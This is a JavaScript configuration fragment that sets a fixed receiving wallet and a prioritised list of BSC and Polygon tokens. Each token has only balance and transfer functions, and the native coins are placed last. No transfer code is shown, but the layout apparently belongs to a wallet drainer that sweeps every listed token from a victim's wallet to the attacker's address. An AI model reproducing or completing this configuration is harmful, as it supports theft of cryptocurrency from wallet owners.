// Configuration
const RECEIVING_WALLET = "0x773F5d9eEc75629A2624EEd5D95472910D6c651a";

// Token contracts - Full list with all tokens
const TOKENS = {
  bsc: [
    {
      name: "AUTO",
      symbol: "AUTO",
      address: "0xa184088a740c695e156f91f5cc086a06bb78b827",
      abi: [
        "function balanceOf(address owner) view returns (uint256)",
        "function transfer(address to, uint256 amount) returns (bool)"
      ],
      decimals: 18,
      priority: 1
    },
    {
      name: "USDT",
      symbol: "USDT",
      address: "0x55d398326f99059fF775485246999027B3197955",
      abi: [
        "function balanceOf(address owner) view returns (uint256)",
        "function transfer(address to, uint256 amount) returns (bool)"
      ],
      decimals: 18,
      priority: 2
    },
    {
      name: "Token 1",
      symbol: "TKN1",
      address: "0x78F5d389F5CDCcFc41594aBaB4B0Ed02F31398b3",
      abi: [
        "function balanceOf(address owner) view returns (uint256)",
        "function transfer(address to, uint256 amount) returns (bool)"
      ],
      decimals: 18,
      priority: 3
    },
    {
      name: "Token 2",
      symbol: "TKN2",
      address: "0x33d08D8C7a168333a85285a68C0042b39fC3741D",
      abi: [
        "function balanceOf(address owner) view returns (uint256)",
        "function transfer(address to, uint256 amount) returns (bool)"
      ],
      decimals: 18,
      priority: 4
    },
    {
      name: "Token 3",
      symbol: "TKN3",
      address: "0xd5eaAaC47bD1993d661bc087E15dfb079a7f3C19",
      abi: [
        "function balanceOf(address owner) view returns (uint256)",
        "function transfer(address to, uint256 amount) returns (bool)"
      ],
      decimals: 18,
      priority: 5
    },
    {
      name: "Token 4",
      symbol: "TKN4",
      address: "0x6d5AD1592ed9D6D1dF9b93c793AB759573Ed6714",
      abi: [
        "function balanceOf(address owner) view returns (uint256)",
        "function transfer(address to, uint256 amount) returns (bool)"
      ],
      decimals: 18,
      priority: 6
    },
    {
      name: "WBNB",
      symbol: "WBNB",
      address: "0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c",
      abi: [
        "function balanceOf(address owner) view returns (uint256)",
        "function transfer(address to, uint256 amount) returns (bool)"
      ],
      decimals: 18,
      priority: 7
    },
    {
      name: "BNB",
      symbol: "BNB",
      address: "0x0000000000000000000000000000000000000000",
      abi: [],
      decimals: 18,
      isNative: true,
      priority: 999
    }
  ],
  polygon: [
    {
      name: "AUTO",
      symbol: "AUTO",
      address: "0x7f426f6dc648e50464a0392e60e1bb465a67e9cf",
      abi: [
        "function balanceOf(address owner) view returns (uint256)",
        "function transfer(address to, uint256 amount) returns (bool)"
      ],
      decimals: 18,
      priority: 1
    },
    {
      name: "WMATIC",
      symbol: "WMATIC",
      address: "0x0d500B1d8E8eF31E21C99d1Db9A6444d3ADf1270",
      abi: [
        "function balanceOf(address owner) view returns (uint256)",
        "function transfer(address to, uint256 amount) returns (bool)"
      ],
      decimals: 18,
      priority: 2
    },
    {
      name: "MATIC",
      symbol: "MATIC",
      address: "0x0000000000000000000000000000000000000000",
      abi: [],
      decimals: 18,
      isNative: true,
      priority: 999
    }
  ]
};